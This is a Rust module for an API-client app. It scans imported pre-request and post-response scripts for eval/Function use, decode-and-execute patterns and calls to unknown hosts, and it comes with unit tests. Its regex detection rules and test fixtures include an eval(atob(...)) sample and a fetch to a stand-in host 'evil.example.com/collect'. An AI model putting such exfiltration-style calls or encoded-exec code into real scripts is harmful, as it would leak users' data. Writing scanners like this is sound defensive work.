//! Import security scanning (spec section 8): "Fixed, small heuristic
//! rule set for MVP -- not AI-generated, not infinitely maintained; a
//! handful of high-signal patterns: `eval()`/`Function()` use,
//! encoded-string decode-and-execute patterns, network calls to hosts
//! outside the collection's known environments."
//!
//! This module only knows how to scan one script's *text* -- it never
//! runs anything (that's `crate::script`, an entirely separate concern).
//! Deliberately kept generic rather than import-specific: spec section 8
//! also wants "the same component" flagging scripts from an unfamiliar
//! peer on first P2P sync (Phase 2, not built yet). The import-flow
//! conveniences that operate on a whole `ImportedCollection` live in
//! `crate::import`, layered on top of the primitives here.
//!
//! These are text heuristics, not a JS parser -- they can both miss
//! genuinely obfuscated code and flag benign code that happens to match a
//! pattern (e.g. a script that legitimately decodes a base64 API
//! response). That tradeoff is the explicit point of "fixed, small
//! heuristic rule set" rather than a much larger static-analysis effort.

use std::collections::HashSet;
use std::sync::LazyLock;

use regex::Regex;
use serde::Serialize;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Critical,
    Warning,
}

#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    pub severity: Severity,
    /// Short stable id (e.g. "eval-usage") -- not shown to the user
    /// directly, but useful for tests and for anything that wants to
    /// filter/group by rule later.
    pub rule: String,
    pub message: String,
    pub snippet: String,
}

/// Hostnames a script's network references are compared against. Not a
/// security boundary by itself (a script referencing an "unknown" host
/// is a Warning, not a block) -- just what makes "outside the
/// collection's known environments" concrete.
#[derive(Debug, Clone, Default)]
pub struct KnownHosts(HashSet<String>);

impl KnownHosts {
    pub fn from_vars<'a>(values: impl IntoIterator<Item = &'a String>) -> Self {
        let mut hosts = HashSet::new();
        for value in values {
            if let Some(host) = extract_host(value) {
                hosts.insert(host);
            }
        }
        KnownHosts(hosts)
    }

    fn contains(&self, host: &str) -> bool {
        self.0.contains(host)
    }
}

fn extract_host(url_like: &str) -> Option<String> {
    url::Url::parse(url_like.trim()).ok()?.host_str().map(|h| h.to_ascii_lowercase())
}

static EVAL_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\b(eval|Function)\s*\(").unwrap());
static DECODE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b(atob|decodeURIComponent|unescape|fromCharCode)\s*\(").unwrap());
static URL_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"https?://[^\s'"`)]+"#).unwrap());

/// Scans one script's source against the fixed rule set. `known_hosts`
/// gates the network-reference rule; pass `&KnownHosts::default()` if
/// there's no meaningful "known" set for the caller's context (every
/// external reference will be flagged in that case).
pub fn scan_script(script: &str, known_hosts: &KnownHosts) -> Vec<Finding> {
    let mut findings = Vec::new();

    let has_eval = EVAL_RE.is_match(script);
    let has_decode = DECODE_RE.is_match(script);

    if has_eval && has_decode {
        findings.push(Finding {
            severity: Severity::Critical,
            rule: "encoded-exec".to_string(),
            message: "Decodes an encoded string and runs it via eval()/Function() -- a common way to hide what code actually does."
                .to_string(),
            snippet: first_matching_line(script, &EVAL_RE).unwrap_or_default(),
        });
    } else if has_eval {
        findings.push(Finding {
            severity: Severity::Warning,
            rule: "eval-usage".to_string(),
            message: "Uses eval() or Function() to run dynamically-built code.".to_string(),
            snippet: first_matching_line(script, &EVAL_RE).unwrap_or_default(),
        });
    }

    for m in URL_RE.find_iter(script) {
        let raw = m.as_str();
        let Some(host) = extract_host(raw) else { continue };
        if !known_hosts.contains(&host) {
            findings.push(Finding {
                severity: Severity::Warning,
                rule: "external-network".to_string(),
                message: format!("References \"{host}\", which isn't one of this collection's known hosts."),
                snippet: raw.to_string(),
            });
        }
    }

    findings
}

fn first_matching_line(script: &str, re: &Regex) -> Option<String> {
    script.lines().find(|line| re.is_match(line)).map(|s| s.trim().to_string())
}

/// Scans both of a request's scripts (pre-request and post-response).
pub fn scan_request(request: &crate::format::ApiRequestFile, known_hosts: &KnownHosts) -> Vec<Finding> {
    let mut findings = Vec::new();
    if let Some(s) = &request.script_pre_request {
        findings.extend(scan_script(s, known_hosts));
    }
    if let Some(s) = &request.script_post_response {
        findings.extend(scan_script(s, known_hosts));
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hosts(list: &[&str]) -> KnownHosts {
        KnownHosts(list.iter().map(|s| s.to_string()).collect())
    }

    #[test]
    fn clean_script_has_no_findings() {
        let findings = scan_script("bru.setVar('a', res.body.id); console.log('ok');", &KnownHosts::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn bare_eval_is_a_warning() {
        let findings = scan_script("eval('1+1');", &KnownHosts::default());
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Warning);
        assert_eq!(findings[0].rule, "eval-usage");
    }

    #[test]
    fn bare_new_function_is_a_warning() {
        let findings = scan_script("const f = new Function('return 1');", &KnownHosts::default());
        assert_eq!(findings[0].rule, "eval-usage");
    }

    #[test]
    fn eval_plus_decode_is_critical_not_also_a_warning() {
        let findings = scan_script("eval(atob('Y29uc29sZS5sb2coMSk='));", &KnownHosts::default());
        assert_eq!(findings.len(), 1, "should only fire the combined rule, not both");
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(findings[0].rule, "encoded-exec");
    }

    #[test]
    fn unknown_external_host_is_flagged() {
        let findings = scan_script("fetch('https://evil.example.com/collect');", &hosts(&["api.example.com"]));
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule, "external-network");
        assert!(findings[0].message.contains("evil.example.com"));
    }

    #[test]
    fn known_host_is_not_flagged() {
        let findings = scan_script("fetch('https://api.example.com/ping');", &hosts(&["api.example.com"]));
        assert!(findings.is_empty());
    }

    #[test]
    fn mixed_known_and_unknown_hosts_only_flags_unknown() {
        let script = "fetch('https://api.example.com/a'); fetch('https://tracker.bad.test/b');";
        let findings = scan_script(script, &hosts(&["api.example.com"]));
        assert_eq!(findings.len(), 1);
        assert!(findings[0].message.contains("tracker.bad.test"));
    }

    #[test]
    fn templated_url_is_not_treated_as_a_literal_host() {
        // {{base_url}} never matches the http(s):// literal pattern at
        // all, so no finding -- this is the expected, desired behavior
        // for the normal case of a script using the request's own var.
        let findings = scan_script("req.url = '{{base_url}}/x';", &KnownHosts::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn known_hosts_from_vars_extracts_hosts_and_ignores_non_urls() {
        let vars = vec![
            "https://api.example.com".to_string(),
            "not a url".to_string(),
            "https://Other.Example.com/path".to_string(),
        ];
        let known = KnownHosts::from_vars(&vars);
        assert!(known.contains("api.example.com"));
        assert!(known.contains("other.example.com")); // lowercased
    }

    #[test]
    fn scan_request_aggregates_both_script_slots() {
        let mut request = sample_request();
        request.script_pre_request = Some("eval('x');".to_string());
        request.script_post_response = Some("fetch('https://unknown.test');".to_string());
        let findings = scan_request(&request, &KnownHosts::default());
        assert_eq!(findings.len(), 2);
    }

    #[test]
    fn scan_request_with_no_scripts_is_empty() {
        let findings = scan_request(&sample_request(), &KnownHosts::default());
        assert!(findings.is_empty());
    }

    fn sample_request() -> crate::format::ApiRequestFile {
        crate::format::ApiRequestFile::parse("meta {\n  name: x\n  type: http\n  seq: 1\n}\n\nget {\n  url: https://example.com\n}\n").unwrap()
    }
}
